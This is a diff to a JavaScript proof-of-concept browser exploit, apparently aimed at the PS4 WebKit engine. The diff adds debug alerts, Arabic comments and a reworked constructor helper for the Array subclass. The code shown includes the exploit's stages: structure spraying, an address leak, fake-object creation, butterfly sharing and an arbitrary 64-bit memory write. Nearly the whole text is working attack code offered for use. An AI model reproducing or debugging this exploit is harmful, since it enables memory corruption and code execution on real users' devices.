@@ -1,5 +1,6 @@
+// ===== debug-enhanced PoC with fixed of(args) =====
 
-// safeAlert
+// safeAlert: يجمع الوسائط ويعرضها كسطر واحد
 function safeAlert() {
     try {
         var parts = [];
@@ -8,17 +9,17 @@ function safeAlert() {
         }
         alert(parts.join(' '));
     } catch (e) {
+        // إذا alert نفسها عطّلت لسبب ما، جرّب print أو console.log
         try { print(parts.join(' ')); } catch(_) {
             try { console.log(parts.join(' ')); } catch(_) {}
         }
     }
 }
 
-
+// fallback لـ gc() لو مش موجودة عشان ما يوقف السكربت
 if (typeof gc === 'undefined') {
     gc = function() { /* no-op in PS4 if not present */ };
 }
-
 
 safeAlert('DEBUG: SCRIPT START');
 
@@ -59,9 +60,20 @@ try {
     class X extends Array {}
     Object.defineProperty(X.prototype,'1337',{})
 
+    // ===== fixed of(args) =====
+    // نستخدم bind.apply مع إدراج null كبداية لضمان thisArg صحيح
     function of(args) {
-        return new (Function.prototype.bind.apply(X, args))
+        try {
+            // concat null لضمان الشكل: [thisArg, arg1, arg2, ...]
+            var bound = Function.prototype.bind.apply(X, [null].concat(args));
+            // create new instance from bound constructor
+            return new bound();
+        } catch (e) {
+            safeAlert('of(args) construct error: ' + String(e));
+            throw e;
+        }
     }
+    // ===== end of fixed of(args) =====
 
     safeAlert('phase: build args');
     var obj = {a:42.42}
@@ -132,7 +144,6 @@ try {
         throw e
     }
 
-    // rest of exploit...
     safeAlert('phase: structure spray & leak');
     var structure_spray = []
     for (var i = 0; i < 1000; ++i) {
@@ -191,7 +202,6 @@ try {
     var holder = {fake: {}}
     holder.fake = stage1.fakeobj(fake_addr)
 
-    // Share a butterfly
     var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
     safeAlert('unboxed butterfly = ' + hex(shared_butterfly))
     var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
@@ -239,7 +249,6 @@ try {
         throw e
     }
 
-    // final demo write (may crash if address invalid)
     try {
         stage2.write64(0x4141414140, 0x4242424240)
         safeAlert('final write attempted');
